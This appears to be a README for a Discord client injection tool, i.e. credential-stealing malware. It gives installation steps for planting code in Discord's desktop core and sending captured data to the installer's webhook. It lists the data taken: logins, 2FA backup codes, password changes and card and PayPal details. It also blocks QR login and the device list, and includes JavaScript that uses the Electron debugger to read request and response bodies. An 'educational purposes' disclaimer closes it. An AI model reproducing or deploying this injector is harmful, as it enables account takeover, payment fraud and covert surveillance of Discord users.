<h1 align="center">
  Discord Injection 💉
</h1>

## Features
- Intercept login, register and 2FA login requests
- Intercept backup codes requests
- Intercept email/password changes requests
- Intercept credit card/paypal adding
- Logout user after initial injection
- Block usage of QR Code to login
- Block request to see devices

## Installation
- Completely close Discord
- Copy the [injection code](https://raw.githubusercontent.com/saeed0x1/proxycord-discord-injector/main/injection.js) inside your Discord desktop core:

`%APPDATA%\Local\Discord\app-<app-version>\modules\discord_desktop_core-<core-version>\discord_desktop_core\index.js`

- Replace `%WEBHOOK%` by your Discord webhook. The informations intercepted will be sent this way.
- Restart Discord

## How does backup codes sniffing work ?
I use the [debugger](https://www.electronjs.org/docs/latest/api/debugger) instead of the [WebRequests instance methods](https://www.electronjs.org/docs/latest/api/web-request#instance-methods). It allow me to get request body AND response body:

```js
mainWindow.webContents.debugger.on('message', async (_, method, params) => {
    if (method !== 'Network.responseReceived') return;
    if (![200, 202].includes(params.response.status)) return;

    const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
        requestId: params.requestId
    });
    const responseData = JSON.parse(responseUnparsedData.body);

    const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
        requestId: params.requestId
    });
    const requestData = JSON.parse(requestUnparsedData.postData);
})
```
The backup codes are in the response body of `/mfa/codes-verification` request

## Disclaimer:

### Important Notice:
This injection is inteded for educational purposes only. This is provided strictly for educational and research purposes. Under no circumstances this should be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.

